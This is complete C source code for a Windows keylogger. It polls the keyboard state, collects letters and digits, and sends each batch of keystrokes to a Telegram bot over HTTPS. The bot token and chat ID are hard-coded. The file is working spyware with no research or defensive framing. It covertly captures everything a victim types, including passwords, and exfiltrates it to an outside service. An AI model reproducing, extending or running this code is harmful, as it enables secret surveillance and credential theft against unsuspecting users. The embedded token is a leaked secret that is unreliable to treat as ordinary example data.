#include <windows.h>
#include <winhttp.h>
#include <wchar.h>

static void send_telegram(const char *text) {
    HINTERNET hSession = WinHttpOpen(L"LLIW", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (hConnect) {
        wchar_t path[512];
        swprintf(path, 512, L"/bot8821534079:AAFs4yoi5_v8ptTNKBscNPvOEmfWCiqM84I/sendMessage?chat_id=1826421483&text=%hs", text);
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (hRequest) {
            WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
            WinHttpReceiveResponse(hRequest, NULL);
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
    }
    WinHttpCloseHandle(hSession);
}

static void keylogger_loop(void) {
    static int prev[256];
    char buffer[4096] = {0};
    size_t len = 0;
    while (1) {
        for (int vk = 0; vk < 256; vk++) {
            int down = (GetAsyncKeyState(vk) & 0x8000);
            if (down && !prev[vk]) {
                if (vk >= 0x41 && vk <= 0x5A)
                    buffer[len++] = (char)(vk + 32);
                else if (vk >= 0x30 && vk <= 0x39)
                    buffer[len++] = (char)vk;
            }
            prev[vk] = down;
        }
        if ((GetAsyncKeyState(VK_BACK) & 0x8000)) {
            if (len > 0) { buffer[len] = '\0'; send_telegram(buffer); len = 0; }
            send_telegram("backspace");
        }
        if ((GetAsyncKeyState(VK_SPACE) & 0x8000)) {
            if (len > 0) { buffer[len] = '\0'; send_telegram(buffer); len = 0; }
            send_telegram("espacio");
        }
        if ((GetAsyncKeyState(VK_RETURN) & 0x8000)) {
            if (len > 0) { buffer[len] = '\0'; send_telegram(buffer); len = 0; }
            send_telegram("enter");
        }
        if ((GetAsyncKeyState(VK_TAB) & 0x8000)) {
            if (len > 0) { buffer[len] = '\0'; send_telegram(buffer); len = 0; }
            send_telegram("tab");
        }
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpszCmd, int nShow) {
    keylogger_loop();
    return 0;
}
